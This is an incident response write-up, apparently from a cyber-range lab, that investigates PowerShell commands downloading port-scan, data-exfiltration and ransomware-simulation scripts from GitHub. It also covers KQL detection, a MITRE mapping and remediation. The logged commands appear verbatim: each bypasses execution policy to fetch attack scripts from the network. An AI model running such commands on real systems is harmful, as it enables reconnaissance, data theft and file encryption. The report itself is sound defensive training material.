# 🛡️ Incident Response Report: PowerShell Suspicious Web Request (NIST 800-161 Compliant)

---

## 1. Detection

**Incident Trigger:**  
An alert was raised for suspicious PowerShell web requests involving the account:

**Account:** `<king>`

**Affected Host Information:**
- **HostName:** `king-vm`
- **Operating System:** Windows
- **OS Version:** Windows
- **Last Internal IP Address:** `10.0.0.84`
- **Last External IP Address:** `68.154.42.194`

**Observed Commands Executed:**  
The following PowerShell commands were executed using the `-ExecutionPolicy Bypass` parameter:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
```

🧮 Detection Query:
To investigate the execution of suspicious PowerShell scripts, the following KQL query was used:

```kql
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == "king-vm"
| where ProcessCommandLine contains "-File" and InitiatingProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, InitiatingProcessCommandLine
| summarize Count = count() by AccountName, DeviceName, FileName, InitiatingProcessCommandLine
```

### 📑 NIST 800-161 Compliance:

- ID.AM-1: Inventory and management of user accounts and scripts.

- PR.DS-5: Protection of system integrity by detecting unauthorized code execution.

## 2. Analysis

#### Code Review: Using Browserling, the URLs were accessed, and the scripts were analyzed. Each script’s function was verified and categorized.

#### One-Line Descriptions of Each Script:

- **[portscan.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/portscan.ps1)** - Scans a specified IP range for open common ports and logs the results for network reconnaissance.

- **[eicar.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/eicar.ps1)** - Creates an EICAR test file to simulate a benign virus detection for testing antivirus software responses.

- **[exfiltratedata.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/exfiltratedata.ps1)** - Generates fake employee data, compresses it, and uploads it to Azure Blob Storage to simulate data exfiltration.

- **[pwncrypt.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/pwncrypt.ps1)** - Encrypts files containing sensitive data and leaves a ransom note, simulating ransomware behavior.

## MITRE ATT&CK TTP Assessment:
- **T1046 - Network Service Scanning**: Executed through portscan.ps1.

- **T1059.001 - Command and Scripting Interpreter**: PowerShell - Usage of PowerShell for execution.

- **T1567.002 - Exfiltration Over Alternative Protocol**: Data exfiltration simulated by uploading to Azure Blob Storage.

- **T1486 - Data Encrypted for Impact**: Encryption of local files via pwncrypt.ps1.

## 3. Containment, Eradication, and Recovery
🚫 Containment Actions:

- Isolated the device from the network using Microsoft Defender for Endpoint (MDE).

- Executed a comprehensive antivirus (AV) scan to detect and mitigate any further malicious code.

### Eradication Steps:

- Reimaged the device and redeployed it using the last known good backup.

### Recovery Measures:

- Enrolled the affected user in an updated security awareness training program using KnowBe4.

- Developed and implemented a new policy to restrict PowerShell usage for non-administrative users.

## 📑 NIST 800-161 Compliance:

- PR.PT-5: Restrict execution of scripts and enforce least privilege for administrative actions.

- RS.MI-3: Eradication of malware and unauthorized scripts.

- RC.IM-1: Implementation of improved policies to mitigate future incidents.

## 4. Lessons Learned & Security Improvements
- Enhance monitoring rules for PowerShell execution with bypass flags.

- Implement stricter conditional access and endpoint protection policies.

- Regularly audit administrative privileges and script execution logs.


